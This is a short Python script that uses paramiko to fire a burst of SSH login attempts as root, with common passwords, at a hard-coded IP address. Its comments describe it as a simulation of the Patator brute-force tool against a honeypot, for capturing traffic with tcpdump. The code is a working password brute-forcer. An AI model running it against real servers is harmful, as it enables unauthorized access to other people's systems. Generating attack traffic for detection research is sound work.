import paramiko
import time
import sys

# Configuration
TARGET_IP = "48.199.16.135"
TARGET_PORT = 22
USERNAME = "root"
# A list of common passwords to simulate a brute-force burst
PASSWORDS = ["123456", "password", "admin", "admin123", "root", "toor", "qwerty", "12345", "welcome"] * 10

def start_simulation():
    print(f"🚀 Starting SSH-Patator simulation on {TARGET_IP}:{TARGET_PORT}...")
    print(f"Total attempts: {len(PASSWORDS)}")
    
    for i, password in enumerate(PASSWORDS):
        client = paramiko.SSHClient()
        # Automatically add the host key (for the honeypot)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # We attempt a login; the honeypot will reject it
            client.connect(TARGET_IP, port=TARGET_PORT, username=USERNAME, password=password, timeout=1)
            print(f"[{i}] Success: {password}") # Should not happen with honeypot
            client.close()
        except paramiko.AuthenticationException:
            # This is what we expect - a failed login attempt
            sys.stdout.write(".")
            sys.stdout.flush()
        except Exception as e:
            # Connection errors (likely because the honeypot is busy/throttling)
            pass
        
        # No sleep time simulates the "burst" pattern of Patator
        if i % 10 == 0:
            print(f" Sent {i} attempts...")

    print("\n✅ Simulation complete. Check your tcpdump capture on the VM.")

if __name__ == "__main__":
    start_simulation()
